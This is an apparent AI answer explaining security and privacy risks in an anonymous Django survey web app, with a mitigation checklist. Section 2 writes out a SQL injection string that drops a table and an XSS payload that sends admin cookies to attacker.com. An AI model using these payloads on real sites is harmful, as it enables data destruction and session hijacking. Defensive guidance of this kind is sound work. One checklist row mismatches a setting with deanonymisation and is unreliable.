> **Prompt**: What security risks exist in anonymous survey submissions? What other vulnerabilities should I watch for in a survey web application?

Securing an anonymous survey application is a unique challenge because the primary feature—**anonymity**—is often at odds with traditional security measures like authentication and rate limiting.

The risks typically fall into two categories: **Integrity Risks** (protecting the data from being manipulated) and **Privacy Risks** (protecting the user from being deanonymized).

---

## 1. Security Risks in Anonymous Submissions
When you remove the login requirement, you open the door to several automated and manual attacks.

### Automated Spam and "Ballot Stuffing"
Without a user account, it is difficult to enforce "one response per person."
* **Bot Attacks:** Automated scripts can submit thousands of entries in seconds, skewing results or causing a **Denial of Service (DoS)** by overwhelming your database.
* **The "Incognito" Bypass:** If you rely on browser cookies to prevent multiple submissions, users can simply use private browsing or clear their cache to vote again.

### Data Poisoning
Attackers may submit specific, calculated responses to manipulate the survey's outcome (e.g., artificially lowering a product's satisfaction rating). Because the submissions are anonymous, it is extremely difficult to "audit" or remove these specific entries later without discarding the entire dataset.

### Metadata Deanonymization
Even if you don't ask for a name, the "pipes" carrying the data can betray the user:
* **IP Logging:** If your Django server logs the IP address of every request, the survey isn't truly anonymous.
* **User-Agent Strings:** Unique combinations of browser versions, OS, and hardware can create a "fingerprint" that identifies an individual in a small group.

---

## 2. General Survey Web App Vulnerabilities
Beyond the anonymity aspect, survey apps are high-value targets for traditional web attacks because they are designed to accept and display user input.

### Injection Attacks (SQL & NoSQL)
If survey answers are not properly sanitized before being saved to your Django models, an attacker could submit a "payload" as an answer.
* **Example:** A user enters `'); DROP TABLE survey_results; --` into a text field. If your query isn't using Django’s ORM correctly (e.g., using `raw()` incorrectly), your data could be wiped.

### Stored Cross-Site Scripting (XSS)
This is the most common risk for survey admins. An attacker submits JavaScript as their answer.
* **The Attack:** An answer is submitted as `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`.
* **The Result:** When the admin logs into the dashboard to view results, the script executes in the **admin's browser**, potentially stealing their session cookie and taking over the site.



### Business Logic: "Small N" Identification
This is a design vulnerability rather than a code bug. If you allow admins to filter results by too many categories (e.g., "Department: Finance" AND "Role: Manager"), and there is only one person who fits that criteria, the survey is no longer anonymous.

---

## 3. Recommended Defensive Checklist
To build a secure, anonymous Django survey app in 2026, consider these layers:

| Vulnerability | Mitigation Strategy |
| :--- | :--- |
| **Bot Spam** | Use **Turnstile** or **reCAPTCHA v3**. Avoid v2 "Click the traffic lights" as they frustrate real users. |
| **Ballot Stuffing** | Implement **IP-based rate limiting** via `django-ratelimit` and use **FingerprintJS** to identify devices without storing PII. |
| **XSS** | Always use Django's template engine (which escapes by default) and implement a strict **Content Security Policy (CSP)**. |
| **Deanonymization** | Set `DATA_UPLOAD_MAX_MEMORY_SIZE` to prevent large payloads and ensure your server logs (Nginx/Apache) strip IPs before storage. |
| **Small Group Bias** | Implement a "Minimum Threshold" (e.g., do not show results for any segment with fewer than 5 respondents). |
